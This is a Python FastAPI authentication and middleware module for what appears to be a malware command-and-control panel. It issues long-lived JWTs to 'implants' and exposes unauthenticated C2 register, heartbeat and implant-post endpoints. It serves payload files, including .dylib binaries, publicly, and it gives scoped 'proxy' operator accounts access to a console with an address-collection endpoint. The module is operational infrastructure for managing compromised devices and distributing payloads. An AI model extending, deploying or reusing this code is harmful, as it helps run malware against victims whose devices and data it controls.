"""
Admin / proxy / implant JWT authentication and request middleware.
"""

from __future__ import annotations

import os
import secrets
import time
from typing import Any, Optional

import bcrypt
import jwt
from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import JSONResponse

from .captcha import verify_captcha
from .database import get_user_by_username, init_admin_user, write_audit_log

router = APIRouter(tags=["Auth"])

JWT_SECRET = os.environ.get("JWT_SECRET") or secrets.token_hex(32)
JWT_ALG = "HS256"
JWT_TTL_SECONDS = int(os.environ.get("JWT_TTL_SECONDS", str(86400 * 7)))
IMPLANT_TTL_SECONDS = int(os.environ.get("IMPLANT_TTL_SECONDS", str(86400 * 30)))
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")
if not ADMIN_PASSWORD:
    # 不内置默认口令：凭据只从环境变量注入，避免随源码泄漏。
    # 若未设置，服务仍可启动（已有管理员不会被覆盖，见 init_admin_user 的
    # INSERT OR IGNORE），但全新部署时无法创建管理员，需显式配置。
    ADMIN_PASSWORD = ""
TWEAK_REPORT_KEY = os.environ.get("TWEAK_REPORT_KEY", "")
AUTH_DISABLED = os.environ.get("AUTH_DISABLED", "").lower() in ("1", "true", "yes")

PUBLIC_GET_SUFFIXES = (
    ".html",
    ".js",
    ".css",
    ".png",
    ".jpg",
    ".jpeg",
    ".svg",
    ".ico",
    ".dylib",
    ".wasm",
    ".json",
    ".bin",
    ".map",
)

PUBLIC_EXACT = {
    "/",
    "/group.html",
    "/docs",
    "/openapi.json",
    "/redoc",
    "/favicon.ico",
}

PUBLIC_PREFIXES = (
    "/payloads/",
    "/api/payload/",
    "/api/auth/login",
    "/api/auth/captcha",
    "/api/track",
    "/api/iptj",
    "/api/ip-sync/",
    "/api/c2/register",
    "/api/proxies/channel/",
)

IMPLANT_PATHS = {
    "/api/c2/heartbeat",
    "/api/c2/implant-post",
    "/api/c2/ack",
}

PROXY_FORBIDDEN_PREFIXES = (
    "/api/settings/",
    "/api/demo/",
    "/api/audit",
    "/api/notifications/",
    "/api/export/",
    "/api/qrcode/",
)


class LoginRequest(BaseModel):
    username: str
    password: str
    captcha_id: str = ""
    captcha_code: str = ""


def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def verify_password(password: str, password_hash: str) -> bool:
    try:
        return bcrypt.checkpw(password.encode("utf-8"), password_hash.encode("utf-8"))
    except Exception:
        return False


def create_admin_token(username: str) -> str:
    now = time.time()
    return jwt.encode(
        {
            "sub": username,
            "role": "admin",
            "proxy_id": "",
            "iat": now,
            "exp": now + JWT_TTL_SECONDS,
        },
        JWT_SECRET,
        algorithm=JWT_ALG,
    )


def create_proxy_token(username: str, proxy_id: str) -> str:
    now = time.time()
    return jwt.encode(
        {
            "sub": username,
            "role": "proxy",
            "proxy_id": proxy_id,
            "iat": now,
            "exp": now + JWT_TTL_SECONDS,
        },
        JWT_SECRET,
        algorithm=JWT_ALG,
    )


def create_implant_token(session_id: str) -> str:
    now = time.time()
    return jwt.encode(
        {
            "sub": session_id,
            "role": "implant",
            "iat": now,
            "exp": now + IMPLANT_TTL_SECONDS,
        },
        JWT_SECRET,
        algorithm=JWT_ALG,
    )


def decode_token(token: str) -> dict[str, Any]:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG])
    except jwt.PyJWTError as exc:
        raise HTTPException(401, f"Invalid token: {exc}") from exc


def extract_bearer(request: Request) -> str:
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    return request.query_params.get("access_token", "").strip()


def is_public_path(path: str, method: str) -> bool:
    if path in PUBLIC_EXACT:
        return True
    for prefix in PUBLIC_PREFIXES:
        if path.startswith(prefix):
            return True
    if method == "GET":
        for suffix in PUBLIC_GET_SUFFIXES:
            if path.endswith(suffix):
                return True
    return False


def is_proxy_forbidden(path: str, method: str) -> bool:
    for prefix in PROXY_FORBIDDEN_PREFIXES:
        if path.startswith(prefix):
            return True
    if path == "/api/collect/addresses" and method == "PUT":
        return True
    if path == "/api/proxies/hierarchy" and method == "POST":
        return True
    return False


def get_request_auth(request: Request) -> dict[str, Any]:
    auth = getattr(request.state, "auth", None)
    if auth:
        return auth
    if AUTH_DISABLED:
        return {"sub": ADMIN_USER, "role": "admin", "proxy_id": ""}
    token = extract_bearer(request)
    if not token:
        raise HTTPException(401, "Token required")
    payload = decode_token(token)
    request.state.auth = payload
    return payload


def require_admin(request: Request) -> dict[str, Any]:
    payload = get_request_auth(request)
    if payload.get("role") != "admin":
        raise HTTPException(403, "Admin role required")
    return payload


def require_console_user(request: Request) -> dict[str, Any]:
    payload = get_request_auth(request)
    if payload.get("role") not in ("admin", "proxy"):
        raise HTTPException(403, "Console access required")
    return payload


def require_implant(request: Request, session_id: str = "") -> dict[str, Any]:
    if AUTH_DISABLED:
        return {"sub": session_id, "role": "implant"}
    token = extract_bearer(request)
    if not token:
        raise HTTPException(401, "Implant token required")
    payload = decode_token(token)
    if payload.get("role") != "implant":
        raise HTTPException(403, "Implant role required")
    if session_id and payload.get("sub") != session_id:
        raise HTTPException(403, "Token/session mismatch")
    return payload


def require_tweak_or_admin(request: Request) -> dict[str, Any]:
    if AUTH_DISABLED:
        return {"role": "tweak"}
    tweak_key = request.headers.get("x-tweak-key", "")
    if TWEAK_REPORT_KEY and tweak_key == TWEAK_REPORT_KEY:
        return {"role": "tweak"}
    return require_admin(request)


@router.post("/api/auth/login", summary="Console login (admin or proxy)")
async def login(body: LoginRequest):
    captcha_disabled = os.environ.get("CAPTCHA_DISABLED", "").lower() in ("1", "true", "yes")
    if not AUTH_DISABLED and not captcha_disabled:
        if not verify_captcha(body.captcha_id, body.captcha_code):
            raise HTTPException(401, "Invalid captcha")

    row = get_user_by_username(body.username)
    if not row or not verify_password(body.password, row.get("password_hash", "")):
        raise HTTPException(401, "Invalid username or password")

    role = row.get("role", "admin")
    if role == "proxy":
        proxy_id = row.get("proxy_id", "")
        if not proxy_id:
            raise HTTPException(403, "Proxy account not linked")
        token = create_proxy_token(body.username, proxy_id)
    else:
        token = create_admin_token(body.username)
        role = "admin"

    write_audit_log({
        "who": body.username,
        "action": "login",
        "resource": "auth",
        "detail": f"{role} login",
    })
    return {
        "code": 0,
        "data": {
            "access_token": token,
            "token_type": "Bearer",
            "expires_in": JWT_TTL_SECONDS,
            "username": body.username,
            "role": role,
            "proxy_id": row.get("proxy_id", ""),
        },
    }


@router.get("/api/auth/me", summary="Current console profile")
async def auth_me(request: Request):
    payload = require_console_user(request)
    return {
        "code": 0,
        "data": {
            "username": payload.get("sub"),
            "role": payload.get("role"),
            "proxy_id": payload.get("proxy_id", ""),
        },
    }


class AuthMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        if AUTH_DISABLED:
            request.state.auth = {"sub": ADMIN_USER, "role": "admin", "proxy_id": ""}
            return await call_next(request)

        path = request.url.path
        if is_public_path(path, request.method):
            return await call_next(request)

        if path in IMPLANT_PATHS:
            return await call_next(request)

        if path == "/api/hooks/report":
            try:
                require_tweak_or_admin(request)
            except HTTPException as exc:
                return JSONResponse(
                    status_code=exc.status_code,
                    content={"code": exc.status_code, "msg": exc.detail},
                )
            return await call_next(request)

        token = extract_bearer(request)
        if not token:
            return JSONResponse(
                status_code=401,
                content={"code": 401, "msg": "Token required"},
            )
        try:
            payload = decode_token(token)
        except HTTPException as exc:
            return JSONResponse(
                status_code=exc.status_code,
                content={"code": exc.status_code, "msg": exc.detail},
            )

        role = payload.get("role")
        if role not in ("admin", "proxy"):
            return JSONResponse(
                status_code=403,
                content={"code": 403, "msg": "Console access required"},
            )
        if role == "proxy" and is_proxy_forbidden(path, request.method):
            return JSONResponse(
                status_code=403,
                content={"code": 403, "msg": "Admin only endpoint"},
            )

        request.state.auth = payload
        return await call_next(request)


def ensure_default_admin() -> None:
    # 未配置 ADMIN_PASSWORD 时不创建任何账号：否则会写入一个空口令管理员，
    # 比不创建更危险。已有管理员的部署不受影响（init_admin_user 用 INSERT OR IGNORE）。
    if not ADMIN_PASSWORD:
        return
    init_admin_user(ADMIN_USER, hash_password(ADMIN_PASSWORD))
